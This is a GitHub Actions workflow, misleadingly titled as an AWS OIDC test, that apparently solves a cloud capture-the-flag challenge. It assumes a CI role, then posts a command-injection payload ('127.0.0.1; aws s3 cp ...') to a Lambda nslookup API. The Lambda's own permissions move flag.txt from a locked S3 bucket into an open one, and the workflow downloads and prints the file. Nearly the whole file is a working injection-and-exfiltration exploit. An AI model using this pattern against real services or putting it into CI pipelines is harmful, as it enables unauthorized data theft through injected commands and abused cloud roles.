name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          SOURCE_BUCKET="codec4f26c862a321ef5"
          TARGET_BUCKET="site781fe43f26b9eba3"
          
          echo "=== 1. USING LAMBDA TO BRIDGE flag.txt TO OPEN BUCKET ==="
          # The Lambda (lambdaRole) reads flag.txt from the locked bucket 
          # and copies it into the open companion bucket where cicdRole has access!
          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3 cp s3://${SOURCE_BUCKET}/flag.txt s3://${TARGET_BUCKET}/flag.txt\"}"
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 3 SECONDS FOR S3 SYNC ==="
          sleep 3
          
          echo "=== 3. DOWNLOADING THE REAL FLAG DIRECTLY ==="
          # Your cicdRole downloads the bridged file from the companion bucket with zero blocks!
          aws s3 cp "s3://${TARGET_BUCKET}/flag.txt" ./real_flag.txt
          
          echo ""
          echo "=== 4. BEHOLD THE GLORIOUS FLAG ==="
          cat ./real_flag.txt
